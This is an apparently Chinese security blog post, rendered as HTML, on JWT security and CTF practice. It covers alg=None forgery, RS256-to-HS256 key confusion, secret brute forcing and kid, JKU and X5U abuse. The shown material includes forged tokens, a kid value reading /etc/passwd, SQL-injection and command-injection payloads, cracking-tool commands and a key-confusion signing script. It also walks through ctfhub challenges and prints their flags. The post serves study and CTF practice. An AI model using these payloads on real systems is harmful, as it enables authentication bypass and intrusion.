@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      JWT安全与实战 | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>JWT安全与实战</h2>
+  <p class="post-date">2020-10-21</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p><img src="/images/jwt/1_XkmnsJ6Joa6EDFVGUw0tfA.png" alt="1_XkmnsJ6Joa6EDFVGUw0tfA"></p>
+<h3 id="JWT概述"><a href="#JWT概述" class="headerlink" title="JWT概述"></a>JWT概述</h3><p><code>JWT</code>的全称是<code>JSON Web Token</code>。遵循JSON格式，跨域认证解决方案。声明被存储在<code>客户端</code>，而不是服务端内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。</p>
+<h3 id="传统认证"><a href="#传统认证" class="headerlink" title="传统认证"></a>传统认证</h3><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP 是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。</span><br><span class="line"></span><br><span class="line">假设要求登录认证的 Web 页面本身无法进行状态的管理（不记录已登录的状态），那么每次跳转新页面不是要再次登录，就是要在每次请求报文中附加参数来管理登录状态。</span><br><span class="line"></span><br><span class="line">不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的 CPU 及内存资源的消耗。从另一侧面来说，也正是因为 HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。</span><br><span class="line"></span><br><span class="line">保留无状态协议这个特征的同时又要解决类似的矛盾问题，于是引入了 Cookie 技术。Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。</span><br><span class="line"></span><br><span class="line">Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。</span><br><span class="line"></span><br><span class="line">服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。”</span><br></pre></td></tr></table></figure>
+
+<p>摘录来自: 上野宣、于均良. “图解HTTP”。 </p>
+<h3 id="JWT组成"><a href="#JWT组成" class="headerlink" title="JWT组成"></a>JWT组成</h3><p>JWT由三部分组成：<code>header</code>、<code>payload</code>、<code>signature</code></p>
+<h4 id="header"><a href="#header" class="headerlink" title="header"></a>header</h4><p>header部分最常用的两个字段是<code>alg</code>和<code>typ</code>，<code>alg</code>指定了token加密使用的算法（最常用的为<code>HMAC</code>和<code>RSA</code>算法），<code>typ</code>声明类型为JWT</p>
+<p>header类似如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>payload则为用户数据以及一些元数据有关的声明，用以声明权限，举个例子，一次登录的过程可能会传递以下数据：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;user_role&quot;</span> : <span class="string">&quot;finn&quot;</span>,    	<span class="comment">//当前登录用户</span></span><br><span class="line">    <span class="attr">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,          	<span class="comment">//该JWT的签发者,有些是URL</span></span><br><span class="line">    <span class="attr">&quot;iat&quot;</span>: <span class="number">1573440582</span>,        <span class="comment">//签发时间</span></span><br><span class="line">    <span class="attr">&quot;exp&quot;</span>: <span class="number">1573940267</span>,        <span class="comment">//过期时间</span></span><br><span class="line">    <span class="attr">&quot;nbf&quot;</span>: <span class="number">1573440582</span>,        <span class="comment">//该时间之前不接收处理该Token</span></span><br><span class="line">    <span class="attr">&quot;domain&quot;</span>: <span class="string">&quot;example.com&quot;</span>,   <span class="comment">//面向的用户</span></span><br><span class="line">    <span class="attr">&quot;jti&quot;</span>: <span class="string">&quot;dff4214121e83057655e10bd9751d657&quot;</span>   <span class="comment">//Token唯一标识</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h4><p>signature的功能是保护token完整性；生成方式是将header和payload两个部分链接，然后通过header部分指定的<code>算法</code>，计算签名。</p>
+<p>抽象成公式就是</p>
+<p><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key</code></p>
+<p><code>注意：</code>编码header和payload时使用的编码方式为<code>base64urlencode</code>，<code>base64url</code>编码是<code>base64</code>的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。</p>
+<h3 id="JWT安全"><a href="#JWT安全" class="headerlink" title="JWT安全"></a>JWT安全</h3><p>一个完整的jwt格式为(<code>header</code>.<code>payload</code>.<code>signature</code>)，其中header、payload使用<code>base64url</code>编码，signature通过指定算法生成。</p>
+<h4 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h4><h5 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h5><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p>
+<p>这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> : <span class="string">&quot;None&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;user&quot;</span> : <span class="string">&quot;Admin&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成的完整token为<code>ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0</code></p>
+<p>(header+’.’+payload，去掉了’.’+signature字段)</p>
+<p>空加密算法的设计初衷是用于调试的，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。</p>
+<h5 id="RSA改为HMAC"><a href="#RSA改为HMAC" class="headerlink" title="RSA改为HMAC"></a>RSA改为HMAC</h5><p>JWT中最常用的两种算法为<code>HMAC</code>和<code>RSA</code>。</p>
+<p><code>HMAC</code>是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密。</p>
+<p><code>RSA</code>则是一种非对称加密算法，使用私钥加密明文，公钥解密密文。</p>
+<p>在HMAC和RSA算法中，都是使用私钥对<code>signature</code>字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。</p>
+<p>现在我们假设有这样一种情况，一个Web应用，在JWT传输过程中使用RSA算法，密钥<code>pem</code>对JWT token进行签名，公钥<code>pub</code>对签名进行验证。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> : <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通常情况下密钥<code>pem</code>是无法获取到的，但是公钥<code>pub</code>却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时使用获取到的公钥<code>pub</code>作为算法的密钥，对token进行签名，发送到服务器端。</p>
+<p>服务器端会将RSA的公钥（<code>pub</code>）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。</p>
+<p><code>https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/</code></p>
+<h4 id="密钥暴破"><a href="#密钥暴破" class="headerlink" title="密钥暴破"></a>密钥暴破</h4><p>暴破基础</p>
+<ul>
+<li>知悉JWT使用的加密算法</li>
+<li>一段有效的、已签名的token</li>
+<li>签名用的密钥不复杂（弱密钥）</li>
+</ul>
+<p>因此局限性还是较大</p>
+<p>工具参考如下：JWT-Tools</p>
+<p>简单的组合爆破起来相对较简单，一旦复杂起来将很难再进行实施爆破。</p>
+<h4 id="修改KID参数"><a href="#修改KID参数" class="headerlink" title="修改KID参数"></a>修改KID参数</h4><p><code>kid</code>是jwt header中的一个可选参数，全称是<code>key ID</code>，它用于指定加密算法的密钥</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;kid&quot;</span> : <span class="string">&quot;/home/jwt/.ssh/pem&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为该参数可以由用户输入，因此也可能造成一些安全问题。</p>
+<h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><p><code>kid</code>参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，因此，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;kid&quot;</span> : <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h5><p><code>kid</code>也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;kid&quot;</span> : <span class="string">&quot;key11111111&#x27; || union select &#x27;secretkey&#x27; -- &quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>对<code>kid</code>参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了<code>open</code>函数，通过构造参数就可能造成命令注入。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;/path/to/key_file|whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>对于其他的语言，例如php，如果代码中使用的是<code>exec</code>或者是<code>system</code>来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。</p>
+<h4 id="修改JKU-X5U"><a href="#修改JKU-X5U" class="headerlink" title="修改JKU/X5U"></a>修改JKU/X5U</h4><p><code>JKU</code>的全称是”JSON Web Key Set URL”，用于指定一组用于验证令牌的密钥的URL。类似于<code>kid</code>，<code>JKU</code>也可以由用户指定输入数据，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。</p>
+<p><code>X5U</code>则以URI的形式数允许攻击者指定用于验证令牌的<strong>公钥证书或证书链</strong>，与<code>JKU</code>的攻击利用方式类似。</p>
+<h4 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h4><p>JWT保证的是数据传输过程中的完整性而不是机密性。</p>
+<p>由于payload是使用<code>base64url</code>编码的，所以相当于明文传输，如果在payload中携带了敏感信息（如存放密钥对的文件路径），单独对payload部分进行<code>base64url</code>解码，就可以读取到payload中携带的信息。</p>
+<h3 id="JWT-Tools"><a href="#JWT-Tools" class="headerlink" title="JWT Tools"></a>JWT Tools</h3><p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">JWT爆破</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/brendan-rius/c-jwt-cracker.git</span><br><span class="line">cd c-jwt-cracker</span><br><span class="line">brew install openssl</span><br><span class="line">make OPENSSL=/usr/local/opt/openssl/include OPENSSL_LIB=-L/usr/local/opt/openssl/lib</span><br><span class="line">./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/jwt/image-20201020161036706.png" alt="image-20201020161036706"></p>
+<p>JWT在线工具</p>
+<p><a target="_blank" rel="noopener" href="https://jwt.io/">JWT Online</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">JWT_Tool</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pycryptodomex</span><br><span class="line">py3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.dkimTl0KydTeIHQ1UvhjAK7FPfArIkgf8XWp7VsKZyE</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/jwt/image-20201021113441020.png" alt="image-20201021113441020"></p>
+<p><img src="/images/jwt/image-20201021113549915.png" alt="image-20201021113549915"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 修改JWT</span><br><span class="line">2. 生成None算法的JWT</span><br><span class="line">3. 检查RS/HS256公钥错误匹配漏洞</span><br><span class="line">4. 检测JKU密钥是否可伪造</span><br><span class="line">5. 输入一个key,检查是否正确</span><br><span class="line">6. 输入一个存放key的文本，检查是否正确</span><br><span class="line">7. 输入字典文本，爆破</span><br><span class="line">8. 输入RSA公钥，检查是否正确</span><br></pre></td></tr></table></figure>
+
+<p>交互工具</p>
+<p>主要针对<code>alg</code>被致None，因在线工具无法修改为None，所以需要使用交互方式来获取token。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">import jwt</span><br><span class="line">jwt.encode(payload)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="JWT攻击"><a href="#JWT攻击" class="headerlink" title="JWT攻击"></a>JWT攻击</h3><p>以下题目参考<a target="_blank" rel="noopener" href="https://www.ctfhub.com/">ctfhub</a>中关于JWT的CTF试题学习并练习；算法修改并未得到flag。</p>
+<h4 id="题一：信息泄漏"><a href="#题一：信息泄漏" class="headerlink" title="题一：信息泄漏"></a>题一：信息泄漏</h4><p>题目提示信息：敏感信息泄漏</p>
+<p><img src="/images/jwt/image-20201020175137207.png" alt="image-20201020175137207"></p>
+<p>访问URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-f0ba92c933a7d9be.sandbox.ctfhub.com:10080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>提示输入用户名及密码</p>
+<p><img src="/images/jwt/image-20201020175233885.png" alt="image-20201020175233885"></p>
+<p>观察响应数据</p>
+<p><img src="/images/jwt/image-20201020175334255.png" alt="image-20201020175334255"></p>
+<p>发现Cookie属于JWT</p>
+<p><img src="/images/jwt/image-20201020175407427.png" alt="image-20201020175407427"></p>
+<p>复制并提交在线工具</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJBRyI6ImI5MmNlNzk1NDg4ZTZjMDExNjBmNjU4fSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsIkZMIjoiY3RmaHViezA1OGFiZjNiM2IwZTlkOGQ1In0._TNIAg9rDfqtOFejHiIz9tXyJ7-hGqsKlJudTfXYZtw</span><br><span class="line"></span><br><span class="line"># 解码后由下图得知，flag只有一半，但是另一半在header中保存，拼接即可。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/jwt/image-20201020175507938.png" alt="image-20201020175507938"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;058abf3b3b0e9d8d5b92ce795488e6c01160f658&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="题二：None"><a href="#题二：None" class="headerlink" title="题二：None"></a>题二：None</h4><p>题目提示：JWT支持None，并且后端不执行签名验证。</p>
+<p><img src="/images/jwt/image-20201020192649086.png" alt="image-20201020192649086"></p>
+<p>访问URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9f380c0d9554b48b.sandbox.ctfhub.com:10080&#x2F;login.php</span><br></pre></td></tr></table></figure>
+
+<p>admin/admin登录：提示只有admin才能获得flag值。</p>
+<p><img src="/images/jwt/image-20201020192750143.png" alt="image-20201020192750143"></p>
+<p><img src="/images/jwt/image-20201020192907650.png" alt="image-20201020192907650"></p>
+<p>获取登录token并进行在线解码处理</p>
+<p>分别对header、payload进行解码修改对应值并编码处理。</p>
+<p><img src="/images/jwt/image-20201021110733681.png" alt="image-20201021110733681"></p>
+<p><img src="/images/jwt/image-20201021110753552.png" alt="image-20201021110753552"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 因后台不进行签名验证了，因此可直接替换对应值即可绕过。</span><br><span class="line"># 因在线网站无法修改none，因此这里使用python的交互来获取token如下：</span><br><span class="line">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;&#125;</span><br><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;1&quot;,&quot;role&quot;:&quot;admin&quot;&#125;</span><br><span class="line">jwt.encode(&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;1&quot;,&quot;role&quot;:&quot;admin&quot;&#125;,algorithm&#x3D;&quot;none&quot;,key&#x3D;&quot;&quot;)</span><br><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIiwicm9sZSI6ImFkbWluIn0.</span><br></pre></td></tr></table></figure>
+
+<p>用none算法生成的JWT只有两部分了，根本连签名都不存在。</p>
+<p><img src="/images/jwt/image-20201021144848195.png" alt="image-20201021144848195"></p>
+<p>替换token，重放后可得到flag值</p>
+<p><img src="/images/jwt/image-20201021110552087.png" alt="image-20201021110552087"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;adcd547cd87ee1536fba1a7fe530a8d9719e9ee3&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="题三：弱密码"><a href="#题三：弱密码" class="headerlink" title="题三：弱密码"></a>题三：弱密码</h4><p>由题目得知：JWT采用对称加密算法，如果密钥的强度较弱的话，会被爆破攻击。</p>
+<p><img src="/images/jwt/image-20201020201008964.png" alt="image-20201020201008964"></p>
+<p>访问URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-97dc1d0c313c1266.sandbox.ctfhub.com:10080&#x2F;login.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/jwt/image-20201020201106689.png" alt="image-20201020201106689"></p>
+<p>admin/admin</p>
+<p><img src="/images/jwt/image-20201020201132629.png" alt="image-20201020201132629"></p>
+<p>获取JWT的token</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.dkimTl0KydTeIHQ1UvhjAK7FPfArIkgf8XWp7VsKZyE</span><br></pre></td></tr></table></figure>
+
+<p>使用工具进行爆破得到密钥</p>
+<p><img src="/images/jwt/image-20201021111740982.png" alt="image-20201021111740982"></p>
+<p>修改对应值并获得最新的token</p>
+<p><img src="/images/jwt/image-20201021111921365.png" alt="image-20201021111921365"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;11f50e22266935854562ba365e25aabd719a7cc3&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="题四：修改签名算法"><a href="#题四：修改签名算法" class="headerlink" title="题四：修改签名算法"></a>题四：修改签名算法</h4><p>题目：修改签名算法完成绕过;</p>
+<p><img src="/images/jwt/image-20201021112611069.png" alt="image-20201021112611069"></p>
+<p>访问URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9fc2bbd399072286.sandbox.ctfhub.com:10080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>登录入口信息及部分php提示</p>
+<p><img src="/images/jwt/image-20201021141803090.png" alt="image-20201021141803090"></p>
+<p>提示如下：主要关注点下面，主要是对JWT算法并绕过获得flag。</p>
+<p><img src="/images/jwt/image-20201021141738055.png" alt="image-20201021141738055"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;admin&quot;&#125;</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.LURZ-AAb42YweV6rAylSGFB19J5A3dbTMQw0TieJ3u8</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip install pyjwt</span><br><span class="line"></span><br><span class="line">import jwt</span><br><span class="line">import base64</span><br><span class="line">public &#x3D; open(&#39;1.pem&#39;, &#39;r&#39;).read()</span><br><span class="line">print jwt.encode(&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;admin&quot;&#125;, key&#x3D;public, algorithm&#x3D;&#39;HS256&#39;)</span><br></pre></td></tr></table></figure>
+
